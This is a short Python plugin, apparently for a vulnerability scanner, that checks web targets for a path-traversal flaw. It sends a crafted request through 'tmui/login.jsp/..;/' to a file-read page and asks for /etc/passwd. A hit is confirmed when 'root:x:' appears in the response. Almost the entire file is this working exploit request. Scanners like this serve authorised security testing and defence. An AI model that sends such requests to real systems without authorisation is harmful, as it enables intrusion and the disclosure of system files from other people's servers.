#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
                try:
                    async with session.get(url=url) as res:
                        if res:
                            text = str(await res.read())
                            if "root:x:" in text:
                                yield url
                except:
                    pass